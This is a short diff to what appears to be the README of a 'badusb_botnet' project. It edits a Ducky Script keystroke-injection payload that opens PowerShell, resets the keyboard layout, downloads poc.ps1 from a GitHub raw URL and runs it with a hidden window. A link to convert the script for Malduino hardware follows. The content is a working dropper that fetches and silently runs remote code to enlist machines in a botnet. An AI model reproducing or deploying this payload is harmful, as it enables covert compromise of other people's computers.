@@ -41,16 +41,22 @@ STRING powershell
 DELAY 500
 ENTER
 DELAY 750
+STRING Set-WinUserLanguageList -LanguageList en-US -Force
+ENTER
+DELAY 750
 STRING [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
 DELAY 500
 ENTER
-STRING (new-object net.webclient).DownloadFile('https://raw.githubusercontent.com/alexfrancow/badusb_botnet/master/poc.ps1','poc.ps1')
+STRING (new-object net.webclient).DownloadFile('https://raw.githubusercontent.com/joaopandolfi/badusb_botnet/master/poc.ps1','poc.ps1')
 DELAY 500
 ENTER
+DELAY 500
+STRING Set-WinUserLanguageList -LanguageList en-US -Force
+ENTER
+DELAY 500
 STRING powershell.exe -windowstyle hidden -file poc.ps1
 DELAY 500
-ENTER
-```
+ENTER```
 
 > Link to convert to .ino: https://malduino.com/converter/
 
